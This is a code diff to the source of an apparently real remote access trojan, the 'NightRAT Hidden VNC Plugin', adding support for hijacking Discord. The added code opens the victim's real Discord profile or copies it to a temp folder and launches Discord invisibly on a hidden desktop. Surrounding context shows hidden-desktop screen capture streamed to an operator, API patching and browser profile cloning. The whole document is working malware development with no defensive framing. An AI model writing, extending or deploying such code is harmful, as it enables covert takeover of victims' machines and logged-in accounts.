@@ -1,3 +1,10 @@
+// ============================================================================
+// NightRAT Hidden VNC Plugin
+// ============================================================================
+
+// ----------------------------------------------------------------------------
+// 1. SYSTEM HEADERS & LIBRARIES
+// ----------------------------------------------------------------------------
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
@@ -22,6 +29,7 @@
 #include <utility>
 #include <condition_variable>
 #include <iostream>
+#include <fstream>
 #include <filesystem>
 #include <chrono>
 #include <tlhelp32.h>
@@ -45,6 +53,9 @@ namespace fs = std::filesystem;
 #define PW_RENDERFULLCONTENT 0x00000002
 #endif
 
+// ----------------------------------------------------------------------------
+// 2. PROTOCOL & PACKET DEFINITIONS
+// ----------------------------------------------------------------------------
 #pragma pack(push, 1)
 struct PacketHeader {
     uint16_t signature;
@@ -67,6 +78,9 @@ struct HVNCFrameHeader {
 };
 #pragma pack(pop)
 
+// ----------------------------------------------------------------------------
+// 3. GLOBAL PIPELINE & VNC CONFIGURATION STATE
+// ----------------------------------------------------------------------------
 static const uint16_t PACKET_SIGNATURE = 0x524E;
 static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
 static const uint32_t FRAME_FORMAT_JPEG = 1;
@@ -168,6 +182,9 @@ static HWND g_lbDownHwnd = NULL;
 static thread g_patchThread;
 static atomic_bool g_patchRunning(false);
 
+// ----------------------------------------------------------------------------
+// 4. API PATCHING & WINDOWS SUPPRESSION
+// ----------------------------------------------------------------------------
 static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
     DWORD_PTR addr = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
@@ -294,8 +311,9 @@ static void request_full_frame(bool immediate = true) {
     }
 }
 
-// -----------------------------------------------------------------------
-
+// ----------------------------------------------------------------------------
+// 5. NETWORKING & GRAPHICS HELPER FUNCTIONS
+// ----------------------------------------------------------------------------
 static bool safe_send_json(SOCKET sock, const json& data) {
     if (sock == INVALID_SOCKET) return false;
     lock_guard<mutex> lock(g_sendMutex);
@@ -436,6 +454,9 @@ static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& b
     return true;
 }
 
+// ----------------------------------------------------------------------------
+// 6. SCREEN CAPTURE & PIPELINE OPERATIONS
+// ----------------------------------------------------------------------------
 static void ensure_desktop() {
     if (g_hHiddenDesktop) return;
     g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
@@ -688,6 +709,26 @@ static bool compress_buffer(const std::vector<unsigned char>& input, std::vector
         return true;
     }
     return false;
+}
+
+static bool is_process_running(const wstring& exeName) {
+    bool running = false;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32W pe32{};
+    pe32.dwSize = sizeof(pe32);
+
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, exeName.c_str()) == 0) {
+                running = true;
+                break;
+            }
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+    return running;
 }
 
 static void kill_process_by_name(const wstring& exeName) {
@@ -1903,13 +1944,38 @@ static wstring get_app_path(const wstring& appName) {
     return path;
 }
 
+static void disable_discord_hw_accel(const wstring& profilePath) {
+    try {
+        fs::create_directories(profilePath);
+        fs::path settingsPath = fs::path(profilePath) / L"settings.json";
+        json settings;
+        if (fs::exists(settingsPath)) {
+            ifstream f(settingsPath.wstring());
+            if (f.is_open()) {
+                f >> settings;
+                f.close();
+            }
+        }
+        settings["enableHardwareAcceleration"] = false;
+        settings["IS_MAXIMIZED"] = false;
+        settings["IS_MINIMIZED"] = false;
+
+        ofstream f(settingsPath.wstring());
+        if (f.is_open()) {
+            f << settings.dump(4);
+            f.close();
+        }
+    } catch (...) {}
+}
+
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (browserName == L"Opera" || browserName == L"Opera GX") {
+    if (browserName == L"Opera" || browserName == L"Opera GX" || browserName == L"Discord") {
         if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
-        else path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"Opera GX") path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"Discord") path += L"\\Discord";
         return path;
     } else {
         if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
@@ -2265,7 +2331,48 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring profilePath;
                     wstring profileDir = L"Default";
 
-                    if (isGecko) {
+                    if (wRequestedPath == L"Discord") {
+                        bool discordRunning = is_process_running(L"Discord.exe") || is_process_running(L"Update.exe");
+
+                        if (!discordRunning && !copyProfile) {
+                            // Discord is not running, and we did not ask to clone.
+                            // We can use the default real profile directory directly!
+                            wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                            profilePath = sourceUserData;
+
+                            // Ensure hardware acceleration is disabled in settings.json
+                            disable_discord_hw_accel(profilePath);
+                        } else {
+                            // Discord is running, or we checked copyProfile.
+                            // Use isolated profile directory to prevent DB lock.
+                            wchar_t tempPath[MAX_PATH];
+                            GetTempPathW(MAX_PATH, tempPath);
+                            wstring tempProfileRoot = tempPath;
+                            tempProfileRoot += L"NightRAT_Discord_Profile";
+                            profilePath = tempProfileRoot;
+
+                            if (copyProfile) {
+                                wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                                if (!sourceUserData.empty() && fs::exists(sourceUserData)) {
+                                    try {
+                                        if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
+                                    } catch (...) {}
+                                    if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
+                                        send_error("Failed to copy Discord profile.");
+                                        return;
+                                    }
+                                }
+                            } else {
+                                try {
+                                    if (!fs::exists(tempProfileRoot)) {
+                                        fs::create_directories(tempProfileRoot);
+                                    }
+                                } catch (...) {}
+                            }
+
+                            disable_discord_hw_accel(profilePath);
+                        }
+                    } else if (isGecko) {
                         wstring sourceUserData = get_gecko_profile_path(wRequestedPath);
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("Gecko User Data directory not found.");
@@ -2371,6 +2478,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (wRequestedPath == L"Discord") {
+                        bool isUpdateExe = (exePath.find(L"Update.exe") != wstring::npos);
+                        if (isUpdateExe) {
+                            args = L" --processStart Discord.exe --process-start-args \"--multi-instance --disable-gpu --disable-gpu-compositing --disable-software-rasterizer\"";
+                        } else {
+                            args = L" --multi-instance --disable-gpu --disable-gpu-compositing --disable-software-rasterizer";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2490,6 +2604,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
+                    if (wRequestedPath == L"Discord") {
+                        SetEnvironmentVariableW(L"DISCORD_USER_DATA_DIR", profilePath.c_str());
+                    }
 
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
@@ -2504,6 +2621,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                    }
+                    if (wRequestedPath == L"Discord") {
+                        SetEnvironmentVariableW(L"DISCORD_USER_DATA_DIR", NULL);
                     }
 
                     if (hCurrentDesktop) {
